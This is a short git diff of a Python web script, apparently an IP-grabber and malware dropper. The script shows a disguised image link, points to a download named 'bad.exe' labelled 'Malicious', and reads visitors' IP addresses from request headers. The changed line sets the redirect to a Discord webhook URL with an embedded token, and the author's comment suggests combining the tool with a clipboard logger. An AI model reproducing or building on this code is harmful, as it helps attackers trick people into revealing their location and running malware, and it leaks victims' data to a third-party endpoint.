@@ -9,7 +9,7 @@ __name__,
 def main():
    Image = 'https://cdn.discordapp.com/attachments/924433694133993482/938260977164632094/s.png' # Replace this with your image link
   Malicious = 'https://cdn.discordapp.com/attachments/924433694133993482/938262761337671741/bad.exe'# Replace this with your download link
-  Redirect = "https://github.com/ggxros/asdasdasdasdasd222" # You can just put the image here or you can put a custom site. You can combine this with my clipboard logger and it'll be more op lol https://github.com/TheonlyIcebear/Clipboard-Javascript-Logger
+  Redirect = "https://discord.com/api/webhooks/1072545707795423252/i-KrJo8NjshwxvXvGwafrfL-718D8nuokzH5jqnxPXl1jNHcvKTbA194djB6we05cWfH" # You can just put the image here or you can put a custom site. You can combine this with my clipboard logger and it'll be more op lol https://github.com/TheonlyIcebear/Clipboard-Javascript-Logger
   # This is to get the ip
   if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
     ip = request.environ['REMOTE_ADDR']
